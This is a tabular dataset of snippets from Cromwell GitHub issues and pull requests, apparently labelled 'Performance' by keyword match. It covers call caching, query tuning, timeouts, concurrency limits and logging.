Performance,"A few observations:; - If the EJEA is aborted, we could stop hashing the remaining files; - If the EJHA is done, it could stop hashing the remaining files; - Since the EJHA already blocks work into chunks of 100 (and BackendFileHashers tend to be synchronous), it could simply not send the next batch if it knows it doesn't need to; - If the set of initial hashes are a cache miss (and cache writing is disabled), we don't need to send the files for hashing in the first place",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1503:370,cache,cache,370,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1503,2,['cache'],['cache']
Performance,"A flexible way of capturing the data involved in a performance run for later analysis:. Capture the following into files and copy them into GCS somewhere, perhaps [perf bucket]/[perf name]/[cromwell version]. where perf name is a small enumerated list of things we want to perf test, e.g. (5_genome, TJeandet_Call_Cache). * reported metrics; * all metadata; * configuration. Once this is done, the user may delete the instance running cromwell, the DB. It may also choose not to report metrics to Perf Grafana",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4106:51,perform,performance,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4106,1,['perform'],['performance']
Performance,"A handcrafted version of this query: . ```; select; x2.`WORKFLOW_EXECUTION_UUID`,; x2.`WORKFLOW_NAME`,; x2.`WORKFLOW_STATUS`,; x2.`START_TIMESTAMP`,; x2.`END_TIMESTAMP`,; x2.`SUBMISSION_TIMESTAMP`,; x2.`WORKFLOW_METADATA_SUMMARY_ENTRY_ID` ; from; WORKFLOW_METADATA_SUMMARY_ENTRY x2 ; join; (; select; WORKFLOW_EXECUTION_UUID ; from; CUSTOM_LABEL_ENTRY ; where; CUSTOM_LABEL_KEY = 'submissionIdKey' ; and CUSTOM_LABEL_VALUE = 'submissionIdValue'; ) s ; on x2.WORKFLOW_EXECUTION_UUID = s.WORKFLOW_EXECUTION_UUID ; join; (; select; WORKFLOW_EXECUTION_UUID ; from; CUSTOM_LABEL_ENTRY ; where; (; CUSTOM_LABEL_KEY = 'caas-collection-name' ; and CUSTOM_LABEL_VALUE = 'me@gmail.com'; ) ; or (; CUSTOM_LABEL_KEY = 'caas-collection-name' ; and CUSTOM_LABEL_VALUE = 'miguel-collection'; ); ) c ; on c.WORKFLOW_EXECUTION_UUID = x2.WORKFLOW_EXECUTION_UUID; ```. begets a much more performant`EXPLAIN` . ```; mysql> explain select x2.`WORKFLOW_EXECUTION_UUID`, x2.`WORKFLOW_NAME`, x2.`WORKFLOW_STATUS`, x2.`START_TIMESTAMP`, x2.`END_TIMESTAMP`, x2.`SUBMISSION_TIMESTAMP`, x2.`WORKFLOW_METADATA_SUMMARY_ENTRY_ID` from WORKFLOW_METADATA_SUMMARY_ENTRY x2 join (select WORKFLOW_EXECUTION_UUID from CUSTOM_LABEL_ENTRY where CUSTOM_LABEL_KEY = 'submissionIdKey' and CUSTOM_LABEL_VALUE = 'submissionIdValue') s on x2.WORKFLOW_EXECUTION_UUID = s.WORKFLOW_EXECUTION_UUID join (select WORKFLOW_EXECUTION_UUID from CUSTOM_LABEL_ENTRY where (CUSTOM_LABEL_KEY = 'caas-collection-name' and CUSTOM_LABEL_VALUE = 'me@gmail.com') or (CUSTOM_LABEL_KEY = 'caas-collection-name' and CUSTOM_LABEL_VALUE = 'miguel-collection')) c on c.WORKFLOW_EXECUTION_UUID = x2.WORKFLOW_EXECUTION_UUID;; +----+-------------+--------------------+--------+---------------------------------------------+----------------------------------------+---------+---------------------------+------+------------------------------------+; | id | select_type | table | type | possible_keys | key | key_len | ref | rows | Extra |; +----+-------------+---------------",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4598#issuecomment-459106279:869,perform,performant,869,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4598#issuecomment-459106279,1,['perform'],['performant']
Performance,"A quick explanation of the strategy - I did this with a database update at (actually just after) evaluation time. This has a few benefits (as I see it):; - The database is as easy to read and interpret as the metadata.; - We don't need to rehydrate the various data structures required by the expression evaluation logic just to perform a metadata query.; - We know that the evaluated expression in the database is the **exact** expression used in the call. There's no possibility of it being re-calculated incorrectly at a later time (maybe expression logic changes, etc); - I got to re-learn slick database update operations :-D",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/341:329,perform,perform,329,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/341,1,['perform'],['perform']
Performance,"A recent review of Travis test failures revealed that some workflows were failing due to timeouts on functions like read_lines() or read_int() timing out:. ```cromwell.backend.standard.StandardAsyncExecutionActor$$anon$2: Failed to evaluate job outputs:; Bad output 'int_reader.int': Failed to read_int(""""gs://cloud-cromwell-dev/cromwell_execution/travis/globs/57f6e677-c2aa-4d96-bf33-9591fce20da7/call-int_reader/shard-3/stdout"""") (reason 1 of 1): Futures timed out after [10 seconds]; at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionSuccess$1(StandardAsyncExecutionActor.scala:851)```. It's possible that being queued in the I/O actor can take longer than the 10s timeout and thus that is the issue. It's possible this timeout needs to be raised or output evaluation needs to be retried, but this needs a fix as the outputs being evaluated already exist, so this is a bad failure mode. AC: Depending on the potential causes for such behavior, either retry this evaluation, raise the timeout or explore another solution to ensure that jobs dont fail because of this timeout.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057:646,queue,queued,646,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057,1,['queue'],['queued']
Performance,A resume option with call cache skipping would be very useful. Another feature which could be related to this option is unit test capabilities. for example I had run a workflow before (successfully). now I have changed a specific part of it and just want to test it with the inputs provided till that step.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2023#issuecomment-1201794626:26,cache,cache,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2023#issuecomment-1201794626,2,['cache'],['cache']
Performance,"A user had the below features request, which I agreed to pass on to you here. . > It would be nice to have a setting where the user could choose to automatically split an interval file into contigs, or an arbitrary number, for the scatter gather process. I'm sure there are more optimal ways to split interval files, I think I saw in your example script on your github that you chose to split your interval list into 50 pieces due to your local server setup? Not every user is able to optimize an individual analysis, so having the option to automatically split the interval list into contigs is probably better than running it serially. We will probably set up a bash script for it, but having it built in could be usable for others too.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1605:485,optimiz,optimize,485,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1605,1,['optimiz'],['optimize']
Performance,"A very common way of producing a side .md5 file is to use something like. `md5 -q dbsnp_138.vcf > dbsnp_138.vcf.md5`. Which produces a trailing newline character, which cromwell reads and interprets as part of the hash, thus causing cache misses against files that (a) were hashed by cromwell or (b) don't have a newline. Not only isn't this the desired behavior... it's very confusing because it appears that sometimes call caching works and other times it does not. Cromwell should strip out all trailing whitespace (e.g. \n, \r\n) from the data read in the .md5 file",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2621:233,cache,cache,233,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2621,1,['cache'],['cache']
Performance,"A while back we had a fairly serious performance bug due to the usage of `mapValues`. It'd gone away for a while but it seems to be used somewhat frequently again. Currently 22 times in Cromwell. A quick skim of them made at least a few of them look to be pretty suspicious looking. Remove these, or at least prove that any remaining invocation can't possibly be a big deal down the road.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2434:37,perform,performance,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2434,1,['perform'],['performance']
Performance,A/C write a unit test that characterizes the performance of heartbeat writing with and without autocommit.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4249#issuecomment-443798416:45,perform,performance,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4249#issuecomment-443798416,1,['perform'],['performance']
Performance,AC: ; 1. Delete endpoint that targets deleting intermediate output files.; 2. Cleanup of those intermediate outputs if they were utilized by the cache store.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-424981111:145,cache,cache,145,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-424981111,1,['cache'],['cache']
Performance,"AC: Multiple cromwells are used to execute a performance test. ## Desired Deployment. Utilize single instances for summarizer & reader. Bring up a instance ""group"" (a.k.a. cluster) for workers. ### Worker Cromwells [Instance Group](https://cloud.google.com/compute/docs/instance-groups/). Instantiate a GCP instance group to bring up a cluster of 3 nodes. ### TODO. - [ ] Write an instance template to represent a cromwell worker.; - [ ] Edit Jenkins script to bring up instances as described above.; - [ ] Edit instance startup script to remove shutdown part, move that work to end of Jenkins script.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4842:45,perform,performance,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4842,1,['perform'],['performance']
Performance,"AC:. **Case 1:** ; Benchmark the behavior of these endpoints given a few different style of workflows:; Option A: Hello World workflow; Option B: Five Dollar Genome workflow; Option C: CGA Production Workflow. For each case, run concurrent requests to the `/describe` endpoint , benchmark the response time and do so for a variety of concurrent requests: 15, 30, 50, 100... **Case 2:**; Another case can be to see how many raw GitHub pages we can resolve (via http imports) before we start seeing issues from Github -- and observe we fail gracefully.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-456965771:229,concurren,concurrent,229,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-456965771,3,"['concurren', 'response time']","['concurrent', 'response time']"
Performance,"ARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka was writing to logs, not when/where they were generated.; - Akka keeps track of the original when/where with custom log event fields.; - Cromwell and Cromiam are now writing those custom fields if they are found.; - It's a small difference but should help debugging the applications under load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:3400,load,load,3400,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532,1,['load'],['load']
Performance,AWS Batch works in a different way than current platforms and we are taking that into account for something we think will be great on release. Stay tuned to #3744 for more details and progress on this item,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395590745:148,tune,tuned,148,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395590745,1,['tune'],['tuned']
Performance,AWS backend - etag differences in copied files lead to cache misses,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4828:55,cache,cache,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4828,1,['cache'],['cache']
Performance,Ability to specify queueArn within a task,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3745:19,queue,queueArn,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3745,1,['queue'],['queueArn']
Performance,Abort with JES has race conditions,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/700:19,race condition,race conditions,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/700,1,['race condition'],['race conditions']
Performance,Actor Workflow af282f7a-1e95-4390-8cf7-c3bbd93b10b2 failed (during ExecutingWorkflowState): cromwell.core.CromwellFatalException: java.nio.file.NoSuchFileException: /Users/tdyar/workspace/cromwell/cromwell-executions/wf_hello/af282f7a-1e95-4390-8cf7-c3bbd93b10b2/call-hello/execution/rc; 	at cromwell.core.CromwellFatalException$.apply(core.scala:18); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:38); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:37); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.nio.file.NoSuchFileException: /Users/tdyar/workspace/cromwell/cromwell-executions/wf_hello/af282f7a-1e95-4390-8cf7-c3bbd93b10b2/call-hello/execution/rc; 	at sun.nio.fs.UnixException.translateToIOException(UnixException.java:86); 	at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102); 	at sun.nio.fs.UnixException.rethrowAsIOException,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3743:7413,concurren,concurrent,7413,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3743,1,['concurren'],['concurrent']
Performance,"Actor [UUID(efe9c9a5)]: Call-to-Backend assignments: drs_usa_jdr.localize_jdr_drs_with_usa -> papi-v2-usa, drs_usa_jdr.skip_localize_jdr_drs_with_usa -> papi-v2-usa, drs_usa_jdr.read_drs_with_usa -> papi-v2-usa; 2020-10-13 19:03:01,200 cromwell-system-akka.dispatchers.engine-dispatcher-30 INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Restarting drs_usa_jdr.skip_localize_jdr_drs_with_usa, drs_usa_jdr.localize_jdr_drs_with_usa, drs_usa_jdr.read_drs_with_usa; 2020-10-13 19:03:02,934 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Job results retrieved (FetchedFromJobStore): 'drs_usa_jdr.skip_localize_jdr_drs_with_usa' (scatter index: None, attempt 1); 2020-10-13 19:03:03,392 cromwell-system-akka.dispatchers.engine-dispatcher-34 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 19:03:03,667 cromwell-system-akka.dispatchers.engine-dispatcher-30 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 19:03:06,298 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/3237339977528305328; 2020-10-13 19:03:06,299 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/15450562168035605133; 2020-10-13 19:03:40,191 cromwell-system-akka.dispatchers",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:7151,cache,cache,7151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335,1,['cache'],['cache']
Performance,Actor$$returnCodeContents$1.apply(JesAsyncBackendJobExecutionActor.scala:111); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents$1.apply(JesAsyncBackendJobExecutionActor.scala:111); at scala.util.Try$.apply(Try.scala:192); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents$lzycompute(JesAsyncBackendJobExecutionActor.scala:111); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents(JesAsyncBackendJobExecutionActor.scala:111); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$executionResult$1.apply(JesAsyncBackendJobExecutionActor.scala:549); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$executionResult$1.apply(JesAsyncBackendJobExecutionActor.scala:539); at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:980); at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1363); at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1391); at sun.security.ssl.SSLSocketImpl.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1782:3274,concurren,concurrent,3274,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1782,1,['concurren'],['concurrent']
Performance,"Actually it seems that the config I was using already had that line in it, set to 16. I've reduced the concurrent-job-limit to 8, and I'll see how it goes",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-434295499:103,concurren,concurrent-job-limit,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-434295499,1,['concurren'],['concurrent-job-limit']
Performance,Actually now that I think about it this is possible w/o a code change. The service registry stuff is loaded in dynamically by the conf file so you'd just need to not include a metadata service in your conf,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1378#issuecomment-245602916:101,load,loaded,101,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1378#issuecomment-245602916,1,['load'],['loaded']
Performance,Actually the link I posted (also it's one of the key examples in the Akka docs) might not be so useful as it looks like a lot of the places we're using ConfigFactory.load don't have access to the main actor system,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/796#issuecomment-231745141:166,load,load,166,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/796#issuecomment-231745141,1,['load'],['load']
Performance,"Actually unrelated to docker, this is ""make sure if an output changes, we don't call cache using the modified file""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1964#issuecomment-278388151:85,cache,cache,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1964#issuecomment-278388151,1,['cache'],['cache']
Performance,Add 2 perf test cases to benchmark the performance of running an integration test case (https://github.com/broadinstitute/cromwell/blob/develop/centaur/src/main/resources/integrationTestCases/germline/single-sample-production-workflow/PairedEndSingleSampleWf.wdl) using an inputs file referencing all DOS data. 1. A test case that runs the single sample workflow (above) against a dos input files at scale (200 times); 1. A test case that tries to call cache the single sample workflow (above) against a dos input files at scale (200 times),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4300:39,perform,performance,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4300,2,"['cache', 'perform']","['cache', 'performance']"
Performance,"Add a base infrastructure to support StatsD (or other) instrumentation.; The actual implementation sits behind the service registry. Cromwell components can send messages to this service to report information about their behavior and what they're doing.; Default implementation is NooP.; Second implementation is a StatsD client based on what Workbench is doing. It makes the metrics look a bit funky on the StatsD side and needs some tweaking but is simpler than re-implementing a fully scalable client (which I've started doing but backpedaled from as it seemed like too much code to maintain, at least for now). The result can easily be visualized by firing up this docker https://github.com/kamon-io/docker-grafana-graphite, starting a Cromwell server and playing with the dashboards. I started documenting the metrics more in details but it seems like the kind of thing that is likely to change based on what we need / want so I just listed high level categories. Please opine if this is not enough. They're auto-discovered by StatsD anyway so you don't need to know what they are to find them. I also punted on the dependency issue as I don't know where we stand regarding services using specific libraries (@geoffjentry ?) For now they're in core.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2587:488,scalab,scalable,488,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2587,1,['scalab'],['scalable']
Performance,Add cache support to HtCondor,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1104:4,cache,cache,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1104,1,['cache'],['cache']
Performance,Add cached-copy localization strategy.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900:4,cache,cached-copy,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900,1,['cache'],['cached-copy']
Performance,Add call cache diff endpoint to CromIAM,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2430:9,cache,cache,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2430,1,['cache'],['cache']
Performance,Add python caches to gitignore,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5489:11,cache,caches,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5489,1,['cache'],['caches']
Performance,Add support for Platform Load Sharing Facility (LSF) backend.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/980:25,Load,Load,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/980,1,['Load'],['Load']
Performance,"Add the `logsGroup` and `resourceTags` config option to the `default-runtime-attributes` section of the AWS Batch configuration. This enables you to send the logs to a custom log group name and tag the jobs that Cromwell submits. Sample usage:; ```; default-runtime-attributes {; queueArn: ""arn:aws:batch:us-east-1:111222333444:job-queue/job-queue""; logsGroup: ""/Cromwell/job/""; resourceTags {; projectid: ""project1""; }; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7219:280,queue,queueArn,280,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7219,3,['queue'],"['queue', 'queueArn']"
Performance,Add workflow option to not run new job upon certain call cache errors,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2787:57,cache,cache,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2787,1,['cache'],['cache']
Performance,Added an execution token dispenser to limit # of concurrent calls,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1500:49,concurren,concurrent,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1500,1,['concurren'],['concurrent']
Performance,Added an execution token dispenser to limit concurrent calls,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1469:44,concurren,concurrent,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1469,1,['concurren'],['concurrent']
Performance,Added invalidate-bad-cache to call caching options. Closes #1587,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1592:21,cache,cache,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1592,1,['cache'],['cache']
Performance,Added queued and starting jobs to the timing diagram. Closes #1596,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1599:6,queue,queued,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1599,1,['queue'],['queued']
Performance,Added retries on GCS file move to resolve a 404 race condition,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/525:48,race condition,race condition,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/525,1,['race condition'],['race condition']
Performance,Added retries on file move to resolve a race condition Closes #517,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/526:40,race condition,race condition,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/526,1,['race condition'],['race condition']
Performance,Added support for cacheEnabled and cacheForceRw through workflow options. Closes #1163.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1184:18,cache,cacheEnabled,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1184,2,['cache'],"['cacheEnabled', 'cacheForceRw']"
Performance,"Addendum...; ``Ctl-\``. I see a lot of the following, but not much else that stands out.; ```; ""pool-1-thread-11"" #77 prio=5 os_prio=0 tid=0x00007fe0fc083800 nid=0x6ea8 waiting on condition [0x00007fe1ae391000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b793b68> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject). ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-265754582:351,concurren,concurrent,351,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-265754582,1,['concurren'],['concurrent']
Performance,"Addresses [WX-1210](https://broadworkbench.atlassian.net/browse/WX-1210). PR adds the JIRA ticket ID to the auto-commit message we make on the `Cromwhelm` repo on merge. That repo performs checks for a JIRA ID as a step on the `Update and publish new cromwell-helm chart` action. Without the id, the action will always fail. [WX-1210]: https://broadworkbench.atlassian.net/browse/WX-1210?atlOrigin=eyJpIjoiNWRkNTljNzYxNjVmNDY3MDlhMDU5Y2ZhYzA5YTRkZjUiLCJwIjoiZ2l0aHViLWNvbS1KU1cifQ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7180:180,perform,performs,180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7180,1,['perform'],['performs']
